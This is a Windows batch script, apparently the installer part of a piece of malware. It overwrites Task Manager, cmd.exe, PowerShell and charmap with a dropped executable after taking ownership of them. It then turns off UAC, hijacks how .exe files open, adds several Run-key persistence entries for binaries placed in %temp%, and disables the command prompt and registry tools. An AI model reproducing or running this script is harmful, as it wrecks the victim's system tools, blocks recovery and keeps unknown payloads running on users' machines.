copy devil.txt a.txt
del devil.txt
ren a.txt devil.txt

copy kill.txt a.txt
del kill.txt
ren a.txt kill.txt

copy cmds.txt a.txt
del cmds.txt
ren a.txt cmds.txt


ren devil.txt "mesa.exe"
ren "kill.txt" "kill.exe"
ren "cmds.txt" "cmds.exe"


takeown /f C:\Windows\System32\taskmgr.exe & icacls C:\Windows\System32\taskmgr.exe /granted "%username%":F & copy mesa.exe "C:\Windows\System32\taskmgr.exe"

takeown /f C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe & icacls C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe /granted "%username%":F & copy mesa.exe "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
takeown /f C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe & icacls C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe /granted "%username%":F & copy mesa.exe "C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe"
takeown /f C:\Windows\system32\cmd.exe & icacls C:\Windows\system32\cmd.exe /granted "%username%":F & copy mesa.exe "C:\Windows\system32\cmd.exe"
takeown /f C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell_ise.exe & icacls C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell_ise.exe /granted "%username%":F & copy mesa.exe "C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell_ise.exe"
takeown /f C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe & icacls C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe /granted "%username%":F & copy mesa.exe "C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe"
takeown /f C:\Windows\system32\charmap.exe & icacls C:\Windows\system32\charmap.exe /granted "%username%":F & copy mesa.exe "C:\Windows\system32\charmap.exe"

reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System" /f
reg add HKEY_CLASSES_ROOT\exefile\shell\open\command /d C:\Windows\winnt32.exe"%1"%* /f
copy kill.exe %temp%
set a=%temp%\kill.exe
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "kill" /d  "%a%" /f
copy "mess\mess.exe" %temp%
copy "mess\mes.exe" %temp%
set a=%temp%\mess.exe
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "cds" /d  "%a%" /f
copy "cmds.exe" %temp%
set a=%temp%\cmds.exe
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "mess" /d  "%a%" /f
copy "block\mesa.exe" "C:\Windows\system"
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System" /v DisableCMD /t REG_DWORD /d 1 /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f
start ARTE.dll
